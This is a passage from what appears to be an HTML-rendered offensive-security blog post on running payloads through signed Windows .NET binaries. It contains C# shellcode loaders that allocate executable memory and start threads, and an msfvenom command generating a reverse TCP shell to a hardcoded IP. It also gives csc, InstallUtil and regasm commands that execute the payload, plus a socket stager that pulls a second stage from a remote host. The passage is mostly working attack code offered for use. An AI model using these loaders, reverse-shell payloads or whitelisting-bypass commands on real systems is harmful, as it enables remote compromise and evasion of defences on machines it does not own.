<span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span> <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name"><span class="token keyword">bool</span></span> <span class="token function">VirtualProtect</span><span class="token punctuation">(</span><span class="token class-name">IntPtr</span> DStOGXQMMkP<span class="token punctuation">,</span> <span class="token class-name"><span class="token keyword">uint</span></span> CzzIpcuQppQSTBJ<span class="token punctuation">,</span> <span class="token class-name"><span class="token keyword">uint</span></span> JCFImGhkRqtwANx<span class="token punctuation">,</span> <span class="token keyword">out</span> <span class="token class-name"><span class="token keyword">uint</span></span> exgVpSg<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name">IntPtr</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token class-name">UInt32</span> eisuQbXKYbAvA<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> WQATOZaFz<span class="token punctuation">,</span> <span class="token class-name">IntPtr</span> AEGJQOn<span class="token punctuation">,</span><span class="token class-name">IntPtr</span> SYcfyeeSgPl<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> ZSheqBwKtDf<span class="token punctuation">,</span> <span class="token keyword">ref</span> <span class="token class-name">UInt32</span> SZtdSB<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span> <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name">UInt32</span> <span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span><span class="token class-name">IntPtr</span> KqJNFlHpsKOV<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> EYBOArlCLAM<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token function">yrDaTlg</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> QWKpWKhcs <span class="token operator">=</span>
<span class="token punctuation">&#123;</span>SHELLCODE
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token class-name">IntPtr</span> AmnGaO <span class="token operator">=</span> <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>UInt32<span class="token punctuation">)</span>QWKpWKhcs<span class="token punctuation">.</span>Length<span class="token punctuation">,</span> <span class="token number">0x3000</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Marshal<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>QWKpWKhcs<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>IntPtr<span class="token punctuation">)</span><span class="token punctuation">(</span>AmnGaO<span class="token punctuation">)</span><span class="token punctuation">,</span> QWKpWKhcs<span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">IntPtr</span> oXmoNUYvivZlXj <span class="token operator">=</span> IntPtr<span class="token punctuation">.</span>Zero<span class="token punctuation">;</span> <span class="token class-name">UInt32</span> XVXTOi <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token class-name">IntPtr</span> pAeCTfwBS <span class="token operator">=</span> IntPtr<span class="token punctuation">.</span>Zero<span class="token punctuation">;</span>
<span class="token class-name"><span class="token keyword">uint</span></span> BnhanUiUJaetgy<span class="token punctuation">;</span>
<span class="token class-name"><span class="token keyword">bool</span></span> iSdNUQK <span class="token operator">=</span> <span class="token function">VirtualProtect</span><span class="token punctuation">(</span>AmnGaO<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">uint</span><span class="token punctuation">)</span><span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">uint</span><span class="token punctuation">)</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token keyword">out</span> BnhanUiUJaetgy<span class="token punctuation">)</span><span class="token punctuation">;</span>
oXmoNUYvivZlXj <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> AmnGaO<span class="token punctuation">,</span> pAeCTfwBS<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">ref</span> XVXTOi<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>oXmoNUYvivZlXj<span class="token punctuation">,</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="Csc"><a href="#Csc" class="headerlink" title="Csc"></a>Csc</h4><pre><code>&gt;msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.0.107 LPORT=12138 -f csharp
&gt;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:System.Ente rpriseServices.dll /r:System.IO.Compression.dll /target:library /out: C:\Users\y\Desktop\shell.exe /platform:x64 /unsafe C:\Users\y\Desktop\shell.cs
&gt;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\y\Desktop\shell.exe
</code></pre>
<pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token keyword">using</span> <span class="token namespace">System</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Net</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Diagnostics</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Reflection</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Configuration<span class="token punctuation">.</span>Install</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span>InteropServices</span><span class="token punctuation">;</span> 
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Program</span>
<span class="token punctuation">&#123;</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">System<span class="token punctuation">.</span>ComponentModel<span class="token punctuation">.</span>RunInstaller</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Sample</span> <span class="token punctuation">:</span> <span class="token type-list"><span class="token class-name">System<span class="token punctuation">.</span>Configuration<span class="token punctuation">.</span>Install<span class="token punctuation">.</span>Installer</span></span>
<span class="token punctuation">&#123;</span>
<span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">Uninstall</span><span class="token punctuation">(</span><span class="token class-name">System<span class="token punctuation">.</span>Collections<span class="token punctuation">.</span>IDictionary</span> savedState<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
Shellcode<span class="token punctuation">.</span><span class="token function">Exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Shellcode</span>
<span class="token punctuation">&#123;</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">Exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> shellcode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name"><span class="token keyword">byte</span></span><span class="token punctuation">[</span><span class="token number">510</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>
 SHELLCODE
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token class-name">UInt32</span> funcAddr <span class="token operator">=</span> <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>UInt32<span class="token punctuation">)</span>shellcode <span class="token punctuation">.</span>Length<span class="token punctuation">,</span>
MEM_COMMIT<span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>
Marshal<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>shellcode <span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>IntPtr<span class="token punctuation">)</span><span class="token punctuation">(</span>funcAddr<span class="token punctuation">)</span><span class="token punctuation">,</span> shellcode <span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">IntPtr</span> hThread <span class="token operator">=</span> IntPtr<span class="token punctuation">.</span>Zero<span class="token punctuation">;</span>
<span class="token class-name">UInt32</span> threadId <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token class-name">IntPtr</span> pinfo <span class="token operator">=</span> IntPtr<span class="token punctuation">.</span>Zero<span class="token punctuation">;</span>
hThread <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> funcAddr<span class="token punctuation">,</span> pinfo<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">ref</span> threadId<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>hThread<span class="token punctuation">,</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">UInt32</span> MEM_COMMIT <span class="token operator">=</span> <span class="token number">0x1000</span><span class="token punctuation">;</span>
<span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">UInt32</span> PAGE_EXECUTE_READWRITE <span class="token operator">=</span> <span class="token number">0x40</span><span class="token punctuation">;</span>
<span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span>
<span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name">UInt32</span> <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token class-name">UInt32</span> lpStartAddr<span class="token punctuation">,</span><span class="token class-name">UInt32</span> size<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> flAllocationType<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> flProtect<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span>
<span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name"><span class="token keyword">bool</span></span> <span class="token function">VirtualFree</span><span class="token punctuation">(</span><span class="token class-name">IntPtr</span> lpAddress<span class="token punctuation">,</span>
<span class="token class-name">UInt32</span> dwSize<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> dwFreeType<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span>
<span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name">IntPtr</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span>
<span class="token class-name">UInt32</span> lpThreadAttributes<span class="token punctuation">,</span>
<span class="token class-name">UInt32</span> dwStackSize<span class="token punctuation">,</span>
<span class="token class-name">UInt32</span> lpStartAddress<span class="token punctuation">,</span>
<span class="token class-name">IntPtr</span> param<span class="token punctuation">,</span>
<span class="token class-name">UInt32</span> dwCreationFlags<span class="token punctuation">,</span>
<span class="token keyword">ref</span> <span class="token class-name">UInt32</span> lpThreadId
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span>
<span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name"><span class="token keyword">bool</span></span> <span class="token function">CloseHandle</span><span class="token punctuation">(</span><span class="token class-name">IntPtr</span> handle<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span>
<span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name">UInt32</span> <span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>
<span class="token class-name">IntPtr</span> hHandle<span class="token punctuation">,</span>
<span class="token class-name">UInt32</span> dwMilliseconds
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span>
<span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name">IntPtr</span> <span class="token function">GetModuleHandle</span><span class="token punctuation">(</span>
<span class="token class-name"><span class="token keyword">string</span></span> moduleName
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span>
<span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name">UInt32</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span>
<span class="token class-name">IntPtr</span> hModule<span class="token punctuation">,</span>
<span class="token class-name"><span class="token keyword">string</span></span> procName
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span>
<span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name">UInt32</span> <span class="token function">LoadLibrary</span><span class="token punctuation">(</span>
<span class="token class-name"><span class="token keyword">string</span></span> lpFileName
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span>
<span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name">UInt32</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="Regasm"><a href="#Regasm" class="headerlink" title="Regasm"></a>Regasm</h4><pre><code>&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /target:library /out: C:\Users\y\Desktop\dll.dll  /unsafe C:\Users\y\Desktop\dll.cs
&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /u dll.dll
</code></pre>
<pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token keyword">namespace</span> <span class="token namespace">HYlDKsYF</span>
 <span class="token punctuation">&#123;</span>
	 <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">kxKhdVzWQXolmmF</span> <span class="token punctuation">:</span> <span class="token type-list"><span class="token class-name">ServicedComponent</span></span> <span class="token punctuation">&#123;</span>
		 <span class="token keyword">public</span> <span class="token function">kxKhdVzWQXolmmF</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"doge"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
		 <span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">ComRegisterFunction</span></span><span class="token punctuation">]</span>
		 <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> RegisterClass <span class="token punctuation">(</span> <span class="token class-name"><span class="token keyword">string</span></span> pNNHrTZzW <span class="token punctuation">)</span>
		 <span class="token punctuation">&#123;</span>
			 ZApOAKJKY<span class="token punctuation">.</span><span class="token function">QYJOTklTwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			 <span class="token punctuation">&#125;</span>
			 <span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">ComUnregisterFunction</span></span><span class="token punctuation">]</span>
			 <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> UnRegisterClass <span class="token punctuation">(</span> <span class="token class-name"><span class="token keyword">string</span></span> pNNHrTZzW <span class="token punctuation">)</span>
			 <span class="token punctuation">&#123;</span>
				 ZApOAKJKY<span class="token punctuation">.</span><span class="token function">QYJOTklTwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				 <span class="token punctuation">&#125;</span>
				 <span class="token punctuation">&#125;</span>
				 <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ZApOAKJKY</span>  <span class="token punctuation">&#123;</span> <span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span> <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name">UInt32</span> <span class="token function">HeapCreate</span><span class="token punctuation">(</span><span class="token class-name">UInt32</span> FJyyNB<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> fwtsYaiizj<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> dHJhaXQiaqW<span class="token punctuation">)</span><span class="token punctuation">;</span>
				 <span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span> <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name">UInt32</span> <span class="token function">HeapAlloc</span><span class="token punctuation">(</span><span class="token class-name">UInt32</span> bqtaDNfVCzVox<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> hjDFdZuT<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> JAVAYBFdojxsgo<span class="token punctuation">)</span><span class="token punctuation">;</span>
				 <span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span> <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name">UInt32</span> <span class="token function">RtlMoveMemory</span><span class="token punctuation">(</span><span class="token class-name">UInt32</span> AQdEyOhn<span class="token punctuation">,</span> <span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> wknmfaRmoElGo<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> yRXPRezIkcorSOo<span class="token punctuation">)</span><span class="token punctuation">;</span>
				 <span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span> <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name">IntPtr</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token class-name">UInt32</span> uQgiOlrrBaR<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> BxkWKqEKnp<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> lelfRubuprxr<span class="token punctuation">,</span> <span class="token class-name">IntPtr</span> qPzVKjdiF<span class="token punctuation">,</span><span class="token class-name">UInt32</span> kNXJcS<span class="token punctuation">,</span> <span class="token keyword">ref</span> <span class="token class-name">UInt32</span> atiLJcRPnhfyGvp<span class="token punctuation">)</span><span class="token punctuation">;</span>
				 <span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span> <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name">UInt32</span> <span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span><span class="token class-name">IntPtr</span> XSjyzoKzGmuIOcD<span class="token punctuation">,</span> <span class="token class-name">UInt32</span> VumUGj<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> <span class="token function">HMSjEXjuIzkkmo</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">string</span></span> aCWWUttzmy<span class="token punctuation">,</span><span class="token class-name"><span class="token keyword">int</span></span> iJGvqiEDGLhjr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
					 <span class="token class-name">IPEndPoint</span> YUXVAnzAurxH <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">IPEndPoint</span><span class="token punctuation">(</span>IPAddress<span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>aCWWUttzmy<span class="token punctuation">)</span><span class="token punctuation">,</span>iJGvqiEDGLhjr<span class="token punctuation">)</span><span class="token punctuation">;</span>
					 <span class="token class-name">Socket</span> MXCEuiuRIWgOYze <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">Socket</span><span class="token punctuation">(</span>AddressFamily<span class="token punctuation">.</span>InterNetwork<span class="token punctuation">,</span> SocketType<span class="token punctuation">.</span>Stream<span class="token punctuation">,</span> ProtocolType<span class="token punctuation">.</span>Tcp<span class="token punctuation">)</span><span class="token punctuation">;</span>
					 <span class="token keyword">try</span> <span class="token punctuation">&#123;</span> MXCEuiuRIWgOYze<span class="token punctuation">.</span><span class="token function">Connect</span><span class="token punctuation">(</span>YUXVAnzAurxH<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
					 <span class="token keyword">catch</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
					 <span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> Bjpvhc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name"><span class="token keyword">byte</span></span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
					 MXCEuiuRIWgOYze<span class="token punctuation">.</span><span class="token function">Receive</span><span class="token punctuation">(</span>Bjpvhc<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name"><span class="token keyword">int</span></span> IETFBI <span class="token operator">=</span> BitConverter<span class="token punctuation">.</span><span class="token function">ToInt32</span><span class="token punctuation">(</span>Bjpvhc<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> ZKSAAFwxgSDnTW <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name"><span class="token keyword">byte</span></span><span class="token punctuation">[</span>IETFBI <span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token class-name"><span class="token keyword">int</span></span> JFPJLlk <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">while</span><span class="token punctuation">(</span>JFPJLlk <span class="token operator">&lt;</span> IETFBI<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span> JFPJLlk <span class="token operator">+=</span> MXCEuiuRIWgOYze<span class="token punctuation">.</span><span class="token function">Receive</span><span class="token punctuation">(</span>ZKSAAFwxgSDnTW<span class="token punctuation">,</span> JFPJLlk <span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token punctuation">(</span>IETFBI <span class="token operator">-</span> JFPJLlk<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">4096</span> <span class="token punctuation">?</span> <span class="token punctuation">(</span>IETFBI <span class="token operator">-</span> JFPJLlk<span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token number">4096</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
<span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> nXRztzNVwPavq <span class="token operator">=</span> BitConverter<span class="token punctuation">.</span><span class="token function">GetBytes</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>MXCEuiuRIWgOYze<span class="token punctuation">.</span>Handle<span class="token punctuation">)</span><span class="token punctuation">;</span>
Array<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>nXRztzNVwPavq<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span> ZKSAAFwxgSDnTW<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ZKSAAFwxgSDnTW<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xBF</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> ZKSAAFwxgSDnTW<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
<span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">TOdKEwPYRUgJly</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> KNCtlJWAmlqJ<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>KNCtlJWAmlqJ <span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
